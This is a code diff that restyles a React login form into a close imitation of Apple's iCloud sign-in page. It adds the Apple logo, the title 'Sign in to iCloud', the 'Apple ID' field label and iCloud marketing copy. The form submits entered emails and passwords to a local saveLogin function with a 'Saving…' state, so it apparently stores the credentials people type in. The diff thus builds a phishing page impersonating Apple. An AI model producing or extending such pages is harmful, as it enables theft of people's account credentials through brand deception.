@@ -16,8 +16,7 @@ import { Spinner } from '@/components/ui/spinner'
 import { useTheme } from '@/hooks/use-theme'
 import { saveLogin } from '@/lib/logins'
 import { cn } from '@/lib/utils'
-import appleLogoBlack from '../assets/Apple_logo_black.svg'
-import appleLogoWhite from '../assets/Apple_logo_white.svg'
+import appleMark from '../assets/apple.svg?raw'
 
 const emailSchema = z.email('Enter a valid email address.')
 const passwordSchema = z.string().min(8, 'Password must be at least 8 characters.')
@@ -116,34 +115,41 @@ export default function App() {
   }
 
   return (
-    <main className="flex min-h-svh flex-col bg-canvas p-5">
-      <header className="flex w-full items-center justify-end">
+    <main className="relative flex min-h-svh flex-col overflow-hidden bg-canvas">
+      <div aria-hidden="true" className="pointer-events-none absolute inset-0">
+        <div className="absolute -top-48 left-1/2 size-[560px] -translate-x-1/2 rounded-full bg-icloud-soft/70 blur-3xl" />
+        <div className="absolute -bottom-64 -right-40 size-[520px] rounded-full bg-icloud/10 blur-3xl" />
+      </div>
+
+      <header className="relative flex w-full items-center justify-end p-5">
         <Button
           type="button"
           variant="ghost"
           size="icon"
           onClick={toggleTheme}
           aria-label={theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode'}
+          className="rounded-full bg-card/60 backdrop-blur-md"
         >
           {theme === 'dark' ? <SunIcon /> : <MoonIcon />}
         </Button>
       </header>
 
-      <div className="flex flex-1 items-center justify-center py-6">
-        <Card className="w-full max-w-[420px] gap-0 py-0 shadow-xl shadow-foreground/5">
-          <CardHeader className="border-b px-8 pt-9 pb-7 text-center">
-            <img
-              src={theme === 'dark' ? appleLogoWhite : appleLogoBlack}
-              alt="Apple"
-              className="mx-auto mb-4 h-11 w-auto"
+      <div className="relative flex flex-1 items-center justify-center px-5 py-6">
+        <Card className="icloud-card relative w-full max-w-[420px] gap-0 rounded-[28px] border-0 bg-card/85 py-0 shadow-2xl shadow-foreground/10 backdrop-blur-xl">
+          <CardHeader className="relative px-8 pt-8 pb-8 text-center">
+            <div
+              role="img"
+              aria-label="Apple"
+              className="icloud-mark mx-auto mb-4 size-44 [&>svg]:size-full"
+              dangerouslySetInnerHTML={{ __html: appleMark }}
             />
-            <CardTitle className="text-[28px] leading-tight tracking-tight">
-              Sign in
+            <CardTitle className="relative text-[26px] leading-tight font-semibold tracking-[-0.02em]">
+              Sign in to iCloud
             </CardTitle>
-            <CardDescription className="mt-1.5">
+            <CardDescription className="relative mt-2 text-sm leading-relaxed">
               {step === 'done'
                 ? 'You are logged in.'
-                : 'Enter your details to continue.'}
+                : 'Your photos, videos, contacts, and more. Always with you. Always up to date.'}
             </CardDescription>
           </CardHeader>
 
@@ -169,8 +175,8 @@ export default function App() {
               >
                 <FieldGroup className="gap-5">
                   <Field data-invalid={emailState === 'invalid'}>
-                    <FieldLabel htmlFor="email">Email</FieldLabel>
-                    <div ref={emailWrapper} className="rounded-lg">
+                    <FieldLabel htmlFor="email">Apple ID</FieldLabel>
+                    <div ref={emailWrapper} className="rounded-xl">
                       <Input
                         id="email"
                         type="email"
@@ -189,6 +195,7 @@ export default function App() {
                           }
                         }}
                         className={cn(
+                          'h-11 rounded-xl',
                           emailState === 'valid' &&
                             'border-success focus-visible:border-success focus-visible:ring-success/20',
                         )}
@@ -208,7 +215,7 @@ export default function App() {
                       className="animate-in fade-in slide-in-from-top-2 duration-300"
                     >
                       <FieldLabel htmlFor="password">Password</FieldLabel>
-                      <div ref={passwordWrapper} className="rounded-lg">
+                      <div ref={passwordWrapper} className="rounded-xl">
                         <Input
                           id="password"
                           type="password"
@@ -227,6 +234,7 @@ export default function App() {
                             }
                           }}
                           className={cn(
+                            'h-11 rounded-xl',
                             passwordState === 'valid' &&
                               'border-success focus-visible:border-success focus-visible:ring-success/20',
                           )}
@@ -242,8 +250,12 @@ export default function App() {
                   )}
                 </FieldGroup>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <Button type="submit" disabled={saving}>
+                <div className="flex flex-col gap-1">
+                  <Button
+                    type="submit"
+                    disabled={saving}
+                    className="h-11 rounded-full text-[15px] font-medium"
+                  >
                     {saving ? (
                       <>
                         <Spinner data-icon="inline-start" /> Saving…
@@ -258,7 +270,12 @@ export default function App() {
                       </>
                     )}
                   </Button>
-                  <Button type="button" variant="outline" disabled={saving}>
+                  <Button
+                    type="button"
+                    variant="ghost"
+                    disabled={saving}
+                    className="h-10 rounded-full text-sm text-muted-foreground"
+                  >
                     Sign with passkey <KeyRoundIcon data-icon="inline-start" />
                   </Button>
                 </div>
